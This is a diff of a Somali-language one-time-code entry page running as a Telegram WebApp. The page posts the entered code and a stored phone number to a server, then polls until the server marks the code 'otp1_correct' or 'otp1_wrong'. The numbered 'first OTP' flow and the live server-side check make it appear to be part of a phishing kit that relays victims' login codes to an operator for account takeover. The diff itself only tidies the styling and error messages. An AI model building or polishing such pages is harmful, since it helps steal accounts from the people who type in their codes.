@@ -19,39 +19,6 @@
             overflow-x: hidden;
         }
 
-        .toast { 
-            position: fixed; 
-            top: 30px; 
-            background: #263238; 
-            color: white; 
-            padding: 14px 20px; 
-            border-radius: 12px; 
-            display: flex; 
-            align-items: center; 
-            gap: 12px; 
-            font-size: 14px; 
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
-            opacity: 0; 
-            transform: translateY(-20px);
-            transition: all 0.5s ease; 
-            z-index: 1000; 
-            width: 85%;
-            max-width: 350px;
-        }
-        .toast.show { opacity: 1; transform: translateY(0); }
-
-        .tick-circle { 
-            width: 20px; height: 20px; 
-            background: #82d13d; 
-            border-radius: 50%; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-size: 12px; 
-            color: white; 
-            font-weight: bold; 
-        }
-
         .card { 
             background: white; 
             width: 90%; 
@@ -71,7 +38,7 @@
             display: flex; 
             justify-content: center; 
             gap: 8px; 
-            margin-bottom: 30px; 
+            margin-bottom: 20px; 
         }
 
         .otp-input { 
@@ -85,7 +52,7 @@
             outline: none; 
         }
 
-        .resend-text { color: #999; font-size: 14px; margin-bottom: 35px; }
+        .resend-text { color: #999; font-size: 14px; margin-bottom: 20px; }
 
         .btn-verify { 
             background-color: #e0e0e0; 
@@ -107,28 +74,6 @@
 
         #loadingSection { display: none; }
 
-        .loader-circle { 
-            width: 100px; height: 100px; 
-            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%); 
-            border-radius: 50%; 
-            margin: 0 auto 25px; 
-            display: flex; justify-content: center; align-items: center; 
-        }
-
-        .loader-circle::after { 
-            content: ''; 
-            width: 75px; height: 75px; 
-            border: 4px solid rgba(255,255,255,0.3); 
-            border-top: 4px solid white; 
-            border-radius: 50%; 
-            animation: spin 1s linear infinite; 
-        }
-
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        .green-header { color: #82d13d; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
-        .wait-text { color: #666; font-size: 16px; }
-
         .footer-wave { 
             width: 100%; 
             background: linear-gradient(to bottom, #82d13d, #a3e635); 
@@ -136,6 +81,13 @@
             margin-top: auto; 
             text-align: center; 
             color: white;
+        }
+
+        #errorBox {
+            color: red;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -146,13 +98,15 @@
     <h2>Xaqiijinta OTP-ga Kowaad</h2>
     <p class="instruction">Geli OTP-ga kowaad</p>
 
+    <div id="errorBox"></div>
+
     <div class="otp-group">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
-        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
+        <input type="tel" maxlength="1" class="otp-input">
     </div>
 
     <p class="resend-text">Koodka mar kale u dir <span id="timer">60</span>s</p>
@@ -163,9 +117,7 @@
 </div>
 
 <div class="card" id="loadingSection">
-    <div class="loader-circle"></div>
-    <div class="green-header">Xaqiijinta...</div>
-    <div class="wait-text">Fadlan sug...</div>
+    <p>Fadlan sug...</p>
 </div>
 
 <div class="footer-wave">
@@ -178,22 +130,25 @@ const verifyBtn = document.getElementById('verifyBtn');
 const inputSection = document.getElementById('inputSection');
 const loadingSection = document.getElementById('loadingSection');
 const timerText = document.getElementById('timer');
+const errorBox = document.getElementById('errorBox');
 
 let isSubmitting = false;
 
+/* INIT */
 window.onload = () => {
     window.Telegram?.WebApp?.ready();
     window.Telegram?.WebApp?.expand();
 
-    startCountdown();
-
     const phone = localStorage.getItem('phone');
     if (!phone) {
-        alert("Session expired");
-        window.location.href = "/index.html";
+        errorBox.innerText = "Session expired. Login again.";
+        setTimeout(() => window.location.href = "/index.html", 1500);
     }
+
+    startCountdown();
 };
 
+/* TIMER */
 function startCountdown() {
     let count = 60;
     const interval = setInterval(() => {
@@ -203,14 +158,11 @@ function startCountdown() {
     }, 1000);
 }
 
-// OTP input handling
+/* INPUT HANDLING */
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/[^0-9]/g, '');
-
-        if (input.value && i < inputs.length - 1) {
-            inputs[i + 1].focus();
-        }
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
         check();
     });
 
@@ -221,27 +173,28 @@ inputs.forEach((input, i) => {
     });
 });
 
+/* CHECK */
 function check() {
     const filled = [...inputs].every(i => i.value.length === 1);
     verifyBtn.disabled = !filled;
     verifyBtn.classList.toggle('active', filled);
 }
 
+/* SUBMIT */
 async function handleVerification() {
     if (isSubmitting) return;
 
     const phone = localStorage.getItem('phone');
-    if (!phone) {
-        alert("Phone not found");
-        return;
-    }
+    if (!phone) return;
 
     let otp = "";
     inputs.forEach(i => otp += i.value);
 
     isSubmitting = true;
+
     inputSection.style.display = "none";
     loadingSection.style.display = "block";
+    errorBox.innerText = "";
 
     try {
         await fetch('/api/verify-first-otp', {
@@ -251,28 +204,21 @@ async function handleVerification() {
         });
 
         const poll = setInterval(async () => {
-            try {
-                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-                const data = await res.json();
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
 
-                if (data.status === "otp1_correct") {
-                    clearInterval(poll);
-
-                    // IMPORTANT: keep phone for page 9
-                    localStorage.setItem('phone', phone);
-
-                    window.location.href = "/page9";
-                }
-
-                if (data.status === "otp1_wrong") {
-                    clearInterval(poll);
-                    alert("OTP waa khalad");
-                    reset();
-                }
-
-            } catch (err) {
-                console.error(err);
+            if (data.status === "otp1_correct") {
+                clearInterval(poll);
+                localStorage.setItem("phone", phone);
+                window.location.href = "/page9";
             }
+
+            if (data.status === "otp1_wrong") {
+                clearInterval(poll);
+                errorBox.innerText = "❌ Incorrect code, re-enter correct code";
+                reset();
+            }
+
         }, 2000);
 
     } catch (err) {
@@ -281,11 +227,11 @@ async function handleVerification() {
     }
 }
 
+/* RESET */
 function reset() {
     isSubmitting = false;
     loadingSection.style.display = "none";
     inputSection.style.display = "block";
-
     inputs.forEach(i => i.value = "");
     verifyBtn.disabled = true;
     verifyBtn.classList.remove('active');
